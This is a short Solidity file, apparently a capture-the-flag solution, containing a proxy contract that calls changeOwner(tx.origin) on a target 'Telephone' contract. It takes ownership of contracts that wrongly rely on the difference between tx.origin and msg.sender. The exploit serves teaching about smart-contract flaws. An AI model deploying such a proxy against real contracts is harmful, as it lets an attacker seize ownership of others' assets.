// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface ITelephone {
  function changeOwner(address _owner) external;
}


contract TelephoneProxy {

  function giveMeTelephoneOwnership(address _telephoneContract) external {
    ITelephone(_telephoneContract).changeOwner(tx.origin);
  }
}
